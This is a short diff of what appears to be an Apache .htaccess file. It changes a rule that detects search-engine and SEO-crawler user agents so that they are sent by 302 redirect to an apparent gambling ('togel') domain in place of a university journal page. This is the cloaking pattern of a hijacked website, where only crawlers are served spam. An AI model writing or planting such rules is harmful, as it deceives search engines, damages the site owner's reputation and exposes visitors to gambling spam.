@@ -3,7 +3,7 @@
 
     # Deteksi User-Agent bot
     RewriteCond %{HTTP_USER_AGENT} "(googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog)" [NC]
-    RewriteRule ^(.*)$ https://jurnal.fkip.unmul.ac.id/index.php/JLPF [R=302,L]
+    RewriteRule ^(.*)$ https://erek-erektogel.com/ [R=302,L]
 </IfModule>
 
 <IfModule mod_headers.c>
